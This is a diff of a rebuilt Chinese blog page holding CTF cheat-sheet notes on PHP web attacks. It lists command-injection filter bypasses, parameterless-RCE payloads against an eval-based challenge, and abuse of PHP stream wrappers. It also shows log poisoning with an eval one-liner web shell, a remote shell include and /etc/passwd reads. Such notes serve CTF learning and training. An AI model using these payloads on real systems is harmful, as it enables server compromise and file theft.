@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.2">
+<meta name="generator" content="Hexo 7.0.0-rc2">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -121,7 +121,7 @@
       <h1 class="site-title">无星的小窝</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">估计也么的人看</p>
+      <p class="site-subtitle" itemprop="description">技术为辅,业务为主</p>
   </div>
 
   <div class="site-nav-right">
@@ -288,7 +288,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>5.1k</span>
+              <span>5.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -390,22 +390,26 @@
 <li>&amp;&amp;</li>
 <li>;</li>
 <li>%0a</li>
-<li>&gt;<h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3.绕过过滤"></a>3.绕过过滤</h2></li>
+<li>&gt;</li>
+</ul>
+<h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3.绕过过滤"></a>3.绕过过滤</h2><ul>
 <li>关键词过滤</li>
 <li>\    c\at flag.php</li>
 <li>‘ “   c’’a””t flag.php   c”a”t flag.php</li>
 <li>通配符    ca? flag.php   cat fl*   flag.php   fl456789.php</li>
-<li>a=ag;b=at;c$b fl$a.php</li>
+<li>a&#x3D;ag;b&#x3D;at;c$b fl$a.php</li>
 <li>空格</li>
 <li>cat&lt;&gt;flag.php</li>
 <li>%09   %0b  %0c   %a0  ${IFS}</li>
-<li>$IFS   cat$IFS$2flag.php       cat${IFS}flag.php<h2 id="4-使用其他命令"><a href="#4-使用其他命令" class="headerlink" title="4.使用其他命令"></a>4.使用其他命令</h2></li>
-<li>`</li>
+<li>$IFS   cat$IFS$2flag.php       cat${IFS}flag.php</li>
+</ul>
+<h2 id="4-使用其他命令"><a href="#4-使用其他命令" class="headerlink" title="4.使用其他命令"></a>4.使用其他命令</h2><ul>
+<li>&#96;</li>
 <li>cat <code>ls</code>      index.php  flag.php readme.txt</li>
 <li>grep -r “flag”</li>
-<li> 读取当前目录下所有文件的内容，匹配flag</li>
-<li>base64 /flag |  base64 -d        /???/????64 /??4?.???</li>
-<li>echo “cat /flag【命令要base64编码】”| base64 -d | bash</li>
+<li>读取当前目录下所有文件的内容，匹配flag</li>
+<li>base64 &#x2F;flag |  base64 -d        &#x2F;???&#x2F;????64 &#x2F;??4?.???</li>
+<li>echo “cat &#x2F;flag【命令要base64编码】”| base64 -d | bash</li>
 </ul>
 <h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 对伪协议进行过滤</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// asd(asd());    </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
@@ -426,45 +430,45 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
 
 <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include include_once()</span><br><span class="line">require require_once()</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;])</span><br></pre></td></tr></table></figure>
-<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>1.data://伪协议</p>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>1.data:&#x2F;&#x2F;伪协议</p>
 <p>a.条件</p>
-<p>i.allow_url_fopen =On  allow_url_include =On</p>
+<p>i.allow_url_fopen &#x3D;On  allow_url_include &#x3D;On</p>
 <p>b.用法</p>
-<p>i.data://text/plain,<?php phpinfo();?></p>
-<p>ii.data://text/plain;base,【base64编码的内容】</p>
+<p>i.data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></p>
+<p>ii.data:&#x2F;&#x2F;text&#x2F;plain;base,【base64编码的内容】</p>
 <p>iii.data:,<?php phpinfo();?></p>
-<p>2.php://input</p>
+<p>2.php:&#x2F;&#x2F;input</p>
 <p>a.条件和上面一样</p>
 <p>b.用法：</p>
-<p>i.include($_GET[‘file’])    ?file=php://input</p>
+<p>i.include($_GET[‘file’])    ?file&#x3D;php:&#x2F;&#x2F;input</p>
 <p>ii.$_POST:     <?php phpinfo();?></p>
-<p>3.php://filter</p>
-<p>a.php://filter/read=convert.base64-encode/resource=flag.<br>php</p>
+<p>3.php:&#x2F;&#x2F;filter</p>
+<p>a.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.<br>php</p>
 <p>b.<code>php://filter/read=convert.base64-encode/resource=xxx. php</code>(读文件源码)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`php://filter/write=string.rot13/resource=2.php`(写入文件，相当于打开一个写入的文件流，新建一个文件并指定写的方式)</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`?file=php://filter/write=convert.iconv.UCS-2LE.</span><br><span class="line">    UCS-2BE/resource=payload.php`</span><br><span class="line">`&amp;contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?`</span><br><span class="line"></span><br><span class="line">`php://filter/resource=flag.php`(读文件源码)</span><br><span class="line"></span><br><span class="line">    `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`(读文件源码)(每两位调换位置写入)</span><br><span class="line"></span><br><span class="line">    `php://filter/read=convert.quoted-printable-encode/resource=flag.php`(读文件源码)</span><br></pre></td></tr></table></figure>
-<p>4.phar://</p>
+<p>4.phar:&#x2F;&#x2F;</p>
 <p>a.文件上传： zip,     shell.php -&gt; shell.zip    </p>
-<p>b.文件包含： ?file=phar://./shell.zip/shell.php</p>
+<p>b.文件包含： ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.zip&#x2F;shell.php</p>
 <p>c.注意：</p>
-<p>i.shell.zip -&gt;shell.jpg    ?file=phar://./shell.jpg/<br>shell.php</p>
+<p>i.shell.zip -&gt;shell.jpg    ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.jpg&#x2F;<br>shell.php</p>
 <p>ii.即使修改后缀，对phar读压缩包也没有影响</p>
-<p>5.compress.zlib://flag.php</p>
-<p>6.zip:///var/www/html/shell.zip</p>
+<p>5.compress.zlib:&#x2F;&#x2F;flag.php</p>
+<p>6.zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.zip</p>
 <p>a.需要指定绝对路径</p>
-<p>7.zlib://`压缩流</p>
+<p>7.zlib:&#x2F;&#x2F;&#96;压缩流</p>
 <p>8.    <code>compress.zlib://a.txt</code>(读文件)</p>
 <p>9.    <code>compress.bzip2://file.bz2</code></p>
-<p>10.http:/x.x.x.x:81/shell.php</p>
+<p>10.http:&#x2F;x.x.x.x:81&#x2F;shell.php</p>
 <p>日志包含</p>
-<p>?file=/etc/passwd</p>
+<p>?file&#x3D;&#x2F;etc&#x2F;passwd</p>
 <p>日志中，记录了一些关键信息：ip 请求时间  请求行  响应行  user-agent</p>
 <p>1.常见日志路径：</p>
-<p>a.nginx: /var/log/nginx/access.log</p>
-<p>b.apache:   /var/log/apache/access.log</p>
-<p>c./var/log/apache2/access.log</p>
-<p>d./var/log/secure       ssh “<?php phpinfo();?>“@x.x.x.x</p>
+<p>a.nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>b.apache:   &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>c.&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
+<p>d.&#x2F;var&#x2F;log&#x2F;secure       ssh “<?php phpinfo();?>“@x.x.x.x</p>
 <p>2.请求的时候更改UA头，加上一句话<?php eval($_REQUEST[1])?></p>
 <p>3.重新包含日志，传入参数看一下代码能否执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">			$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">			if(isset($file))</span><br><span class="line">			&#123;</span><br><span class="line">				if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">					include ($file . &#x27;.php&#x27;);</span><br><span class="line">				&#125;</span><br><span class="line">				else&#123;</span><br><span class="line">					echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			?&gt;</span><br></pre></td></tr></table></figure>
@@ -493,7 +497,9 @@
 <p>a.<a target="_blank" rel="noopener" href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p>
 <p>4.CTF toolkit</p>
 <p>a.链接：<a target="_blank" rel="noopener" href="https://share.weiyun.com/8cVhjsKl">https://share.weiyun.com/8cVhjsKl</a> 密码：233333</p>
-<p>5.</p>
+<ol start="5">
+<li></li>
+</ol>
 
     </div>
 
@@ -614,20 +620,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">155</span>
+          <span class="site-state-item-count">163</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-count">47</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -709,13 +715,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">317k</span>
+    <span title="站点总字数">334k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:48</span>
+    <span title="站点阅读时长">5:04</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
